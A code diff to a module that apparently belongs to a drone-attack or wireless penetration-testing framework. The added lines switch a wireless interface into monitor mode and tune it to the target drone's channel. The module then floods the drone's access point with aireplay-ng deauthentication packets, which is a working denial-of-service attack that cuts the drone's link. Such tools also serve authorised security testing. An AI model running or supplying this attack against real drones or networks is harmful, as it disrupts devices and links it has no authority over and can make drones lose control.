@@ -26,6 +26,11 @@ interface = options_info.get("interface")
 ## START MODULE ##
 ##################
 
+# Put interface into monitor mode first
+sudo_exec(f"ifconfig {interface} down")
+sudo_exec(f"iwconfig {interface} mode monitor")
+sudo_exec(f"ifconfig {interface} up")
+
 # Targeting specific channel of target drone
 sudo_exec(f"iwconfig {interface} channel {target_channel}")
 
@@ -36,6 +41,6 @@ sudo_exec(f"iwconfig {interface} channel {target_channel}")
 # packets : Number of deauth packets to send
 # -a : Target BSSID (MAC address)
 # target_mac : Target BSSID (MAC) from input file
-# wlan0 : Network interface to use
+# interface : Network interface to use
 
 sudo_exec(f"aireplay-ng -0 {packets} -a {target_mac} {interface}")
